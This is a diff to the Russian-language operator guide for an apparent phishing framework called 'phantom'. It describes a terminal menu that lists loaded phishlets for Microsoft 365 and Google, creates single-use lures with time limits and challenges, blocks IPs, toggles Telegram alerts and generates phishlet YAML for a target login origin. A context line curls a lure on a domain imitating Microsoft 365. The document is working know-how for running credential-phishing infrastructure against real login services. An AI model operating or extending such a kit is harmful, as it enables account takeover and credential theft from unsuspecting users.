@@ -90,19 +90,20 @@ curl.exe -v -k https://m365.verdebudget.ru:8443/l/m365-01 2>&1 | Select-String "
 .\phantom.exe -menu -config config.yaml.example -api 127.0.0.1:8080
 ```
 Удаленно: `-api IP_СЕРВЕРА:8080` (Bearer из `PHANTOM_API_TOKEN` подхватится сам).
-Клавиши: стрелки — навигация, `Enter` — выбрать/выполнить, `tab` — между полями,
-`esc` — назад, `ctrl+c` — выход (сервер продолжает работать).
+При старте меню проверяет связь (пишет `node=...` в шапке, при обрыве —
+экран с подсказкой). Клавиши: стрелки — навигация, `Enter` — выбрать/выполнить,
+`tab` — между полями, `esc` — назад, `ctrl+c` — выход (сервер продолжает работать).
 
-1. **Dashboard** — Enter: `node`, число фишлетов, аптайм, список загруженных.
-2. **Phishlets** — Enter: кто в боевом строю (`labtest, microsoft365, google`).
-3. **Smart lure+** — Enter, заполнить поля (`tab` между ними):
-   path `/l/live01`, phishlet id `labtest`, ttl `0`, max uses `1`,
-   bound ip пусто. Enter — `OK / lure создан: /l/live01`.
-4. **Block IP** — Enter: поле IP `8.8.8.8`, причина `test`, Enter — `OK / blocked`.
-5. **Reload** — Enter: `OK / reloaded ok` (стор перечитан без рестарта).
-6. **Generate** — Enter: origin `login.x.com`, domain `p.test`, id `g9`,
-   Enter — превью YAML (первые 12 строк).
-7. **Quit** — выход в шелл.
+1. **Dashboard** — `node`, число фишлетов, аптайм, список загруженных.
+2. **Config** — домены, TLS-режим, wildcard, Telegram on/off (секретов нет).
+3. **Phishlets** — кто в боевом строю (`labtest, microsoft365, google`).
+4. **Smart lure+** — поля с дефолтами (`tab` между ними):
+   path `/l/op01`, id `labtest`, ttl `120`, max uses `1`, bound ip пусто,
+   challenge `y`. Enter — `✓ OK / приманка создана`.
+5. **Block IP** — IP + причина (дефолт `operator`), Enter.
+6. **Reload** — Enter: стор перечитан без рестарта.
+7. **Generate** — origin/domain/id → превью YAML (первые строки).
+8. **Quit** — выход в шелл.
 
 Проверка снаружи (браузер/curl): открыть созданную приманку —
 первый раз целевой ответ, второй — spoof (одноразовая сгорела);
